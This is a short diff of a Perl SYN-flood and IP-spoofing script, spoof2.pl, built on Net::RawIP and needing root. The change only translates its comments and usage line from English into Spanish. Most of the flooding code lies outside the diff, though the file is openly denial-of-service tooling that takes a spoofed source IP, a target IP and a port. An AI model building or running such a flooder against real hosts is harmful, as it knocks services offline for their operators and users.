@@ -1,8 +1,8 @@
 #!/usr/bin/perl
-# spoof2.pl - Simple SYN Flooder and IP spoof
-# Author: Antonio Taboada
+# spoof2.pl - Simple SYN Flooder y IP spoof
+# Autor: Antonio Taboada
 # Derechos: (c) hackingyseguridad.com 2017
-# Requires perl, Net::RawIP module, and root privileges
+# Requiere perl, Net::RawIP module, y privilegios de root
 
 use Net::RawIP;
 
@@ -15,6 +15,6 @@ if($#ARGV == 2) {
       $a->send;   
    }
 } else {
-   print "./spoof2 source_IP destination_IP destination_PORT\n";
+   print "./spoof2 IP_spoof IP_destino Puerto_destino\n";
 }
 
